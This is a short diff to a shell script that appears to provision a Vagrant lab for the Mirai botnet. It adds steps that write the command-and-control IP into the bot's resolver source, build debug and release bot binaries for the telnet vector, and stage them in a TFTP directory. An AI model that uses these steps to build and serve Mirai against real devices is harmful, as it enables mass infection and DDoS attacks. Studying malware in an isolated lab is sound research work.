@@ -71,6 +71,15 @@ sed -i "s|{cnc_ip}|$cnc_ip|g;" /etc/dnsmasqhosts
 dnsmasq
 
 echo ">>> Building mirai bot and cnc..."
+# process {DNS}
+cp /vagrant/mirai/bot/resolv.cpp /vagrant/mirai/bot/resolv.c
+DNS=$(echo "$cnc_ip" | sed -r 's/[.]/,/g')
+sed -i "s|{DNS}|$DNS|g;" /vagrant/mirai/bot/resolv.c
+
+# build debug
+./build.sh debug telnet
+
+# build release
 cd /vagrant/mirai/
 ./build.sh release telnet
 cp /vagrant/mirai/release/mirai* /vagrant/tftp/
